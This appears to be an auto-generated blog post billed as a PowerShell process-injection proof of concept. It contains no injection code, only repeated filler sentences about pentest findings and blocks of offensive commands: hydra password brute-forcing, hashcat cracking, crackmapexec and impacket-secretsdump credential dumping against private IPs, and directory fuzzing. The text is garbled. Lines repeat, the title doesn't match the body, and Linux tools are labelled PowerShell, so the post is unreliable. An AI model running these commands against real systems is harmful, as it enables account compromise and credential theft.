---
TitleSEO: "Process Injection PoC in PowerShell | ZureFX"
TitlePost: "Process Injection PoC — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for process injection poc. Built for security research and automation."
Keywords: "python, tool, scanner, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-507.html"
URL_IMAGES: ""
Date: "2024-07-12"
Tags: "Python, Tool, Scanner, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-507"
Permalink: "/scripting/script-process-injection-poc-507.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `sqlmap`
- `smbclient`
- `smbclient`

## Implementation

### Core Logic

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.183.116 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
gobuster dir -u http://10.23.231.209/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.24.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.201.40 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.112.131.193 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.34.206
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.47.28.176 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.23.100/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.136.57 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.20.208.148/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 11.52s
```
